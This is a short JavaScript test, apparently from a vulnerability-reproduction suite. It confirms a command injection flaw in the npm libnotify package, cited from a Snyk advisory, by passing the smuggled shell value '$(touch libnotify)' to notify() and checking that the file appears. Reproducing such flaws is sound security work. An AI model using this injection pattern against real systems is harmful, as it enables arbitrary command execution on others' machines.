//https://snyk.io/vuln/npm:libnotify:20130515
test("Command Injection in libnotify", () => {
  const libnotify = require("libnotify");
  const fs = require("fs");
  const path = "./libnotify";
  const sleep = require("sleep");

  //checking that its not present already
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  libnotify.notify("$(touch libnotify)", function () {
    sleep.sleep(5);
    //checking that its created by after exploit.
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);

    fs.unlink(path, function (err) {}); //deleting the file after creation
  });
});
